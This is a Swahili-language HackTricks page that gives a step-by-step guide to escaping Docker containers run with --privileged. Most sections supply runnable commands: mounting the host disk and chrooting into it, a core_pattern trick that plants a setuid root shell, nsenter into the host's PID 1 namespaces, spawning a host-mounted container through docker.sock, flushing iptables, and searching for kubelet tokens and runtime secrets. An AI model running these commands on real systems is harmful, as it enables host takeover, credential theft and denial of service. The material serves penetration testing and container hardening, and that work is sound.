# Kutoroka Kutoka kwenye `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Container iliyoanzishwa kwa `--privileged` si sawa na container ya kawaida yenye permissions moja au mbili za ziada. Kwa vitendo, `--privileged` huondoa au kudhoofisha protections kadhaa za runtime ambazo kwa kawaida huweka workload mbali na resources hatari za host. Athari halisi bado hutegemea runtime na host, lakini kwa Docker matokeo ya kawaida ni:

- capabilities zote hutolewa
- restrictions za device cgroup huondolewa
- filesystems nyingi za kernel huacha ku-mountiwa kama read-only
- default masked procfs paths huondolewa
- seccomp filtering huzimwa
- AppArmor confinement huzimwa
- SELinux isolation huzimwa au kubadilishwa na label yenye wigo mpana zaidi

Jambo muhimu ni kwamba privileged container kwa kawaida **haihitaji** kernel exploit ya kificho. Mara nyingi inaweza kuingiliana moja kwa moja na host devices, host-facing kernel filesystems, au runtime interfaces, kisha kufanya pivot hadi kwenye host shell.

## Kile ambacho `--privileged` Haibadilishi Kiotomatiki

`--privileged` **haijiungi kiotomatiki** na host PID, network, IPC, au UTS namespaces. Privileged container bado inaweza kuwa na private namespaces. Hii inamaanisha kwamba baadhi ya escape chains huhitaji condition ya ziada kama vile:

- host bind mount
- host PID sharing
- host networking
- host devices zinazoonekana
- writable proc/sys interfaces

Conditions hizo mara nyingi ni rahisi kutokea katika misconfigurations halisi, lakini kimawazo ni tofauti na `--privileged` yenyewe.

## Escape Paths

### 1. Mount Host Disk Kupitia Devices Zilizo Exposeiwa

Privileged container kwa kawaida huona device nodes nyingi zaidi chini ya `/dev`. Ikiwa host block device inaonekana, escape rahisi zaidi ni kui-mount na kutumia `chroot` kuingia kwenye host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ikiwa root partition haionekani wazi, kwanza orodhesha mpangilio wa block:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ikiwa njia ya vitendo ni kuweka setuid helper kwenye mount ya host inayoweza kuandikwa badala ya kutumia `chroot`, kumbuka kwamba si kila filesystem huzingatia setuid bit. Ukaguzi wa haraka wa uwezo upande wa host ni:
```bash
mount | grep -v "nosuid"
```
Hii ni muhimu kwa sababu njia zinazoweza kuandikwa ndani ya filesystems za `nosuid` hazivutii sana kwa workflows za kawaida za "weka shell ya setuid na uiendeshe baadaye".

Protections zilizodhoofishwa zinazotumiwa vibaya hapa ni:

- ufichuaji kamili wa devices
- capabilities pana, hasa `CAP_SYS_ADMIN`

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Mount Au Tumia Tena Host Bind Mount Na `chroot`

Ikiwa root filesystem ya host tayari imewekwa ndani ya container, au ikiwa container inaweza kuunda mounts zinazohitajika kwa sababu ina privileged access, host shell mara nyingi hupatikana kwa `chroot` moja tu:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa hakuna host root bind mount iliyopo lakini host storage inafikika, unda moja:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Njia hii hutumia vibaya:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Tumia Vibaya `/proc/sys` Au `/sys` Zinazoweza Kuandikwa

Moja ya madhara makubwa ya `--privileged` ni kwamba ulinzi wa procfs na sysfs huwa dhaifu zaidi. Hii inaweza kufichua kernel interfaces zinazoelekea kwenye host ambazo kwa kawaida hufichwa au huwekwa read-only.

Mfano wa kawaida ni `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Njia nyingine zenye thamani kubwa ni pamoja na:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Njia hii hutumia vibaya:

- masked paths ambazo hazipo
- system paths za read-only ambazo hazipo

Kurasa zinazohusiana:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Tumia Full Capabilities Kwa Mount- Au Namespace-Based Escape

Container yenye privileged hupata capabilities ambazo kwa kawaida huondolewa kwenye containers za kawaida, zikiwemo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, na nyingine nyingi. Mara nyingi hii inatosha kubadilisha foothold ya ndani kuwa host escape pindi tu surface nyingine iliyo exposed inapopatikana.

Mfano rahisi ni kufanya mount ya filesystems za ziada na kutumia namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ikiwa host PID pia imeshirikiwa, hatua huwa fupi zaidi:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Njia hii hutumia vibaya:

- seti chaguomsingi ya privileged capabilities
- optional host PID sharing

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Kupitia Runtime Sockets

Privileged container mara nyingi huishia kuwa na host runtime state au sockets zinazoonekana. Ikiwa Docker, containerd, au CRI-O socket inafikika, mbinu rahisi zaidi mara nyingi ni kutumia runtime API kuzindua container ya pili yenye ufikiaji wa host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kwa containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Njia hii hutumia vibaya:

- ufichuaji wa privileged runtime
- host bind mounts zilizoundwa kupitia runtime yenyewe

Kurasa zinazohusiana:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Ondoa Madhara ya Kutengwa kwa Mtandao

`--privileged` yenyewe haiunganishi container kwenye host network namespace, lakini ikiwa container pia ina `--network=host` au ufikiaji mwingine wa host-network, network stack nzima inaweza kubadilishwa:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hii si mara zote huwa host shell ya moja kwa moja, lakini inaweza kusababisha denial of service, traffic interception, au ufikiaji wa management services zinazopatikana kupitia loopback pekee.

Kurasa zinazohusiana:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Soma Host Secrets Na Runtime State

Hata wakati clean shell escape haipatikani mara moja, privileged containers mara nyingi huwa na ufikiaji wa kutosha kusoma host secrets, hali ya kubelet, runtime metadata, na container filesystems za containers jirani:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ikiwa `/var` ime-mountiwa kutoka kwa host au runtime directories zinaonekana, hii inaweza kutosha kwa lateral movement au cloud/Kubernetes credential theft hata kabla ya host shell kupatikana.

Kurasa zinazohusiana:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

Madhumuni ya commands zifuatazo ni kuthibitisha ni privileged-container escape families zipi zinaweza kutumika mara moja.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Kinachovutia hapa ni:

- full capability set, hasa `CAP_SYS_ADMIN`
- writable proc/sys exposure
- visible host devices
- kukosekana kwa seccomp na MAC confinement
- runtime sockets au host root bind mounts

Yoyote kati ya hizi inaweza kutosha kwa post-exploitation. Kadhaa kati yao kwa pamoja kwa kawaida humaanisha kuwa container iko umbali wa amri moja au mbili tu kutoka kwa host compromise.

## Kurasa Zinazohusiana

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Marejeo

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
